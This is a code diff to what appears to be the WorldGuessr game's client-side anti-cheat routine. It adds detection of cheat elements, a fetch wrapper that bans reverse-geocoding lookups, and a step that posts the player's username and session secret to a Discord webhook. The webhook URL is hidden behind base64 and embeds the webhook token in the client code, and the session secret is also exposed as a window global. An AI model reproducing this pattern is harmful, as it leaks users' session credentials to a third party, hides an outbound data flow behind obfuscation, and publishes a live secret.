@@ -1925,6 +1925,7 @@ setShowCountryButtons(false)
     function checkForCheats() {
       if(document.getElementById("coo1rdinates")) return true;
       if(document.getElementById("map-canvas")) return true;
+      if(document.getElementsByClassName("map-div")[0]) return true;
 
       function hasCheatStyles() {
         const cheatStyleSignatures = [
@@ -1940,6 +1941,10 @@ setShowCountryButtons(false)
         });
     }
 
+
+
+
+
       if(hasCheatStyles()) return true;
     //   try {
     //   if(window.localStorage.getItem("banned")) return true;
@@ -1951,12 +1956,42 @@ setShowCountryButtons(false)
       if(window.banned) return;
       sendEvent("cheat_detected")
       // redirect to banned page
-      window.location.href = "/banned";
-      window.localStorage.setItem("banned", "true")
+
+
+      const text = `Cheat detected from ${window.username} (${window.u_secret})`;
+      const webhookUrl = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1ODUwNDcwOTY4NTc3NjQ2NS9XYVdTNldIaGhVdHFNLVFkb2VxZ3BveDI3VlFoOTlXZ1d1Yi1hemh6eXc1SmpLN3hMNG5pQ1YxY3ZZYjFwbGpaLVhEeA==");
+      const data = {
+        content: text,
+        username: "WorldGuessr",
+      };
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(data),
+      }).then((response) => {
+        window.location.href = "/banned2";
+        window.localStorage.setItem("banned", "true")
+      }
+      ).catch((error) => {
+        window.location.href = "/banned2";
+        window.localStorage.setItem("banned", "true")
+      });
     }
     if(checkForCheats()) {
       banGame();
     }
+    const realFetch = window.fetch;
+    window.fetch = async function(...args) {
+      if (args[0] && typeof args[0] === 'string' && args[0].includes('nominatim.openstreetmap.org/reverse')) {
+        console.warn('Suspicious location fetch detected', args);
+        // Possibly block or track user
+        banGame();
+      }
+      return realFetch.apply(this, args);
+    };
+
     const i = setInterval(() => {
       if(checkForCheats()) {
         banGame();
@@ -1964,6 +1999,11 @@ setShowCountryButtons(false)
     }, 10000);
     return () => clearInterval(i);
   }, [])
+
+  useEffect (() => {
+    window.username = session?.token?.username;
+    window.u_secret = session?.token?.secret;
+  }, [session?.token?.secret])
 //   useEffect(() => {
 // //!(latLong && multiplayerState?.gameData?.state !== 'end')) || (!streetViewShown || loading || (showAnswer && !showPanoOnResult) ||  (multiplayerState?.gameData?.state === 'getready') || !latLong)
 //     // debug this condition:
